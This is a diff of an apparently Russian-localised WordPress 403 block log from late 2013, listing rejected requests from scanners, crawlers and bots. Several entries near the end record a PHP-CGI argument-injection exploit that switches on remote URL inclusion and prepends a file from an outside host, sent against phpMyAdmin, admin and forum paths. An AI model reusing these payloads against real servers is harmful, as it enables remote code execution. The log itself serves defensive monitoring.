+REMOTE_ADDR: 95.84.43.5
+Host Name: 95.84.43.5
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 4, 2013 - 9:24 дп <<<<<<<<<<<
+REMOTE_ADDR: 95.73.79.16
+Host Name: 95.73.79.16
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 4, 2013 - 9:24 дп <<<<<<<<<<<
+REMOTE_ADDR: 95.73.79.16
+Host Name: 95.73.79.16
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 7, 2013 - 7:42 пп <<<<<<<<<<<
+REMOTE_ADDR: 192.241.173.166
+Host Name: 192.241.173.166
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 7, 2013 - 7:51 пп <<<<<<<<<<<
+REMOTE_ADDR: 192.241.172.145
+Host Name: 192.241.172.145
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 12, 2013 - 8:06 дп <<<<<<<<<<<
+REMOTE_ADDR: 184.173.128.234
+Host Name: 184.173.128.234-static.reverse.softlayer.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://siteexplorer.info
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 12, 2013 - 3:49 пп <<<<<<<<<<<
+REMOTE_ADDR: 192.241.162.64
+Host Name: 192.241.162.64
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 12, 2013 - 3:57 пп <<<<<<<<<<<
+REMOTE_ADDR: 192.241.162.64
+Host Name: 192.241.162.64
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 13, 2013 - 12:34 пп <<<<<<<<<<<
+REMOTE_ADDR: 54.227.17.169
+Host Name: ec2-54-227-17-169.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; rv:2.0) Gecko/20100101 Firefox/4.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 13, 2013 - 12:44 пп <<<<<<<<<<<
+REMOTE_ADDR: 23.22.146.149
+Host Name: ec2-23-22-146-149.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; rv:2.0) Gecko/20100101 Firefox/4.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 13, 2013 - 1:02 пп <<<<<<<<<<<
+REMOTE_ADDR: 54.205.5.113
+Host Name: ec2-54-205-5-113.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; rv:2.0) Gecko/20100101 Firefox/4.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 24, 2013 - 2:12 пп <<<<<<<<<<<
+REMOTE_ADDR: 37.53.36.187
+Host Name: 187-36-53-37.pool.ukrtel.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 27, 2013 - 3:35 дп <<<<<<<<<<<
+REMOTE_ADDR: 78.26.130.35
+Host Name: 78.26.130.35
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 27, 2013 - 3:36 дп <<<<<<<<<<<
+REMOTE_ADDR: 78.26.130.35
+Host Name: 78.26.130.35
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 28, 2013 - 8:13 пп <<<<<<<<<<<
+REMOTE_ADDR: 74.105.162.32
+Host Name: pool-74-105-162-32.nwrknj.fios.verizon.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /.swf
+QUERY_STRING: 
+HTTP_USER_AGENT: panscient.com
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - 28.11.2013 - 18:14 <<<<<<<<<<<
+REMOTE_ADDR: 74.105.162.32
+Host Name: pool-74-105-162-32.nwrknj.fios.verizon.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /de/wp-includes/js/jquery/?===e.type&(null==(t=e.getAttribute(
+QUERY_STRING: 
+HTTP_USER_AGENT: panscient.com
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 28, 2013 - 8:14 пп <<<<<<<<<<<
+REMOTE_ADDR: 74.105.162.32
+Host Name: pool-74-105-162-32.nwrknj.fios.verizon.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /.google-analytics.com/ga.js
+QUERY_STRING: 
+HTTP_USER_AGENT: panscient.com
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 29, 2013 - 12:50 пп <<<<<<<<<<<
+REMOTE_ADDR: 144.76.133.78
+Host Name: static.78.133.76.144.clients.your-server.de
 SERVER_PROTOCOL: HTTP/1.0
 HTTP_CLIENT_IP: 
 HTTP_FORWARDED: 
@@ -524,13 +2334,13 @@ HTTP_X_FORWARDED_FOR:
 HTTP_X_CLUSTER_CLIENT_IP: 
 REQUEST_METHOD: GET
 HTTP_REFERER: 
-REQUEST_URI: /holybunch_prep/wp-content/uploads/2014/01/Recording_20140108_1_2_3_4_5.mp4
+REQUEST_URI: /phpBB2/index.php
 QUERY_STRING: 
-HTTP_USER_AGENT: WordPress/3.6.1; http://localhost/holybunch_prep
+HTTP_USER_AGENT: Opera/9.64(Windows NT 5.1; U; en) Presto/2.1.1
 
->>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 11, 2014 - 1:54 пп <<<<<<<<<<<
-REMOTE_ADDR: ::1
-Host Name: Workier
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 29, 2013 - 9:46 пп <<<<<<<<<<<
+REMOTE_ADDR: 144.76.133.78
+Host Name: static.78.133.76.144.clients.your-server.de
 SERVER_PROTOCOL: HTTP/1.0
 HTTP_CLIENT_IP: 
 HTTP_FORWARDED: 
@@ -538,13 +2348,13 @@ HTTP_X_FORWARDED_FOR:
 HTTP_X_CLUSTER_CLIENT_IP: 
 REQUEST_METHOD: GET
 HTTP_REFERER: 
-REQUEST_URI: /holybunch_prep/wp-content/uploads/2014/01/Recording_20140108_2.mp4
+REQUEST_URI: /phpBB2/index.php
 QUERY_STRING: 
-HTTP_USER_AGENT: WordPress/3.6.1; http://localhost/holybunch_prep
+HTTP_USER_AGENT: Opera/9.64(Windows NT 5.1; U; en) Presto/2.1.1
 
->>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 11, 2014 - 1:54 пп <<<<<<<<<<<
-REMOTE_ADDR: ::1
-Host Name: Workier
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 29, 2013 - 10:00 пп <<<<<<<<<<<
+REMOTE_ADDR: 144.76.133.78
+Host Name: static.78.133.76.144.clients.your-server.de
 SERVER_PROTOCOL: HTTP/1.0
 HTTP_CLIENT_IP: 
 HTTP_FORWARDED: 
@@ -552,13 +2362,13 @@ HTTP_X_FORWARDED_FOR:
 HTTP_X_CLUSTER_CLIENT_IP: 
 REQUEST_METHOD: GET
 HTTP_REFERER: 
-REQUEST_URI: /holybunch_prep/wp-content/uploads/2014/01/Recording_20140108_3.mp4
+REQUEST_URI: /phpBB2/index.php
 QUERY_STRING: 
-HTTP_USER_AGENT: WordPress/3.6.1; http://localhost/holybunch_prep
+HTTP_USER_AGENT: Opera/9.64(Windows NT 5.1; U; en) Presto/2.1.1
 
->>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 11, 2014 - 1:55 пп <<<<<<<<<<<
-REMOTE_ADDR: ::1
-Host Name: Workier
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 29, 2013 - 11:36 пп <<<<<<<<<<<
+REMOTE_ADDR: 144.76.133.78
+Host Name: static.78.133.76.144.clients.your-server.de
 SERVER_PROTOCOL: HTTP/1.0
 HTTP_CLIENT_IP: 
 HTTP_FORWARDED: 
@@ -566,13 +2376,13 @@ HTTP_X_FORWARDED_FOR:
 HTTP_X_CLUSTER_CLIENT_IP: 
 REQUEST_METHOD: GET
 HTTP_REFERER: 
-REQUEST_URI: /holybunch_prep/wp-content/uploads/2014/01/Recording_20140108_4.mp4
+REQUEST_URI: /phpBB2/index.php
 QUERY_STRING: 
-HTTP_USER_AGENT: WordPress/3.6.1; http://localhost/holybunch_prep
+HTTP_USER_AGENT: Opera/9.64(Windows NT 5.1; U; en) Presto/2.1.1
 
->>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 11, 2014 - 1:55 пп <<<<<<<<<<<
-REMOTE_ADDR: ::1
-Host Name: Workier
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Ноябрь 30, 2013 - 5:56 дп <<<<<<<<<<<
+REMOTE_ADDR: 144.76.133.78
+Host Name: static.78.133.76.144.clients.your-server.de
 SERVER_PROTOCOL: HTTP/1.0
 HTTP_CLIENT_IP: 
 HTTP_FORWARDED: 
@@ -580,13 +2390,881 @@ HTTP_X_FORWARDED_FOR:
 HTTP_X_CLUSTER_CLIENT_IP: 
 REQUEST_METHOD: GET
 HTTP_REFERER: 
-REQUEST_URI: /holybunch_prep/wp-content/uploads/2014/01/Recording_20140111.mp4
+REQUEST_URI: /phpBB2/index.php
 QUERY_STRING: 
-HTTP_USER_AGENT: WordPress/3.6.1; http://localhost/holybunch_prep
+HTTP_USER_AGENT: Opera/9.64(Windows NT 5.1; U; en) Presto/2.1.1
 
->>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 18, 2014 - 8:04 пп <<<<<<<<<<<
-REMOTE_ADDR: ::1
-Host Name: Workier
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 7, 2013 - 6:00 пп <<<<<<<<<<<
+REMOTE_ADDR: 162.243.66.79
+Host Name: 162.243.66.79
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 7, 2013 - 6:30 пп <<<<<<<<<<<
+REMOTE_ADDR: 162.243.41.33
+Host Name: 162.243.41.33
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 12, 2013 - 12:22 пп <<<<<<<<<<<
+REMOTE_ADDR: 192.96.204.42
+Host Name: hosted-by.leaseweb.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 12, 2013 - 8:20 пп <<<<<<<<<<<
+REMOTE_ADDR: 162.243.60.30
+Host Name: 162.243.60.30
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 12, 2013 - 8:29 пп <<<<<<<<<<<
+REMOTE_ADDR: 162.243.60.30
+Host Name: 162.243.60.30
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 16, 2013 - 7:20 дп <<<<<<<<<<<
+REMOTE_ADDR: 178.68.64.51
+Host Name: 178.68.64.51
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 16, 2013 - 7:20 дп <<<<<<<<<<<
+REMOTE_ADDR: 178.68.64.51
+Host Name: 178.68.64.51
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 17, 2013 - 1:41 пп <<<<<<<<<<<
+REMOTE_ADDR: 112.123.168.54
+Host Name: YUDI-16878
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /Fckeditor/_whatsnew.html
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 18, 2013 - 3:58 пп <<<<<<<<<<<
+REMOTE_ADDR: 54.196.130.228
+Host Name: ec2-54-196-130-228.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; rv:2.0) Gecko/20100101 Firefox/4.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 20, 2013 - 3:42 дп <<<<<<<<<<<
+REMOTE_ADDR: 78.188.54.42
+Host Name: 78.188.54.42.static.ttnet.com.tr
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Fgeovoyagers.de%2Fecho.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/25.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 20, 2013 - 3:42 дп <<<<<<<<<<<
+REMOTE_ADDR: 78.188.54.42
+Host Name: 78.188.54.42.static.ttnet.com.tr
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Fgeovoyagers.de%2Fecho.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/25.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 20, 2013 - 3:42 дп <<<<<<<<<<<
+REMOTE_ADDR: 78.188.54.42
+Host Name: 78.188.54.42.static.ttnet.com.tr
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /pma/?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Fgeovoyagers.de%2Fecho.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/25.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 20, 2013 - 3:42 дп <<<<<<<<<<<
+REMOTE_ADDR: 78.188.54.42
+Host Name: 78.188.54.42.static.ttnet.com.tr
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpmyadmin/?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Fgeovoyagers.de%2Fecho.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/25.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 20, 2013 - 3:42 дп <<<<<<<<<<<
+REMOTE_ADDR: 78.188.54.42
+Host Name: 78.188.54.42.static.ttnet.com.tr
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /admin/?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Fgeovoyagers.de%2Fecho.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/25.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 20, 2013 - 3:42 дп <<<<<<<<<<<
+REMOTE_ADDR: 78.188.54.42
+Host Name: 78.188.54.42.static.ttnet.com.tr
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /login/?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Fgeovoyagers.de%2Fecho.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/25.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 20, 2013 - 3:42 дп <<<<<<<<<<<
+REMOTE_ADDR: 78.188.54.42
+Host Name: 78.188.54.42.static.ttnet.com.tr
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /forum/?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Fgeovoyagers.de%2Fecho.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/25.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 20, 2013 - 3:42 дп <<<<<<<<<<<
+REMOTE_ADDR: 78.188.54.42
+Host Name: 78.188.54.42.static.ttnet.com.tr
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /do.php?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Fgeovoyagers.de%2Fecho.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/25.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 20, 2013 - 3:42 дп <<<<<<<<<<<
+REMOTE_ADDR: 78.188.54.42
+Host Name: 78.188.54.42.static.ttnet.com.tr
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /news.php?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2Fgeovoyagers.de%2Fecho.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/25.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Декабрь 20, 2013 - 3:42 дп <<<<<<<<<<<
+REMOTE_ADDR: 78.188.54.42
+Host Name: 78.188.54.42.static.ttnet.com.tr
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
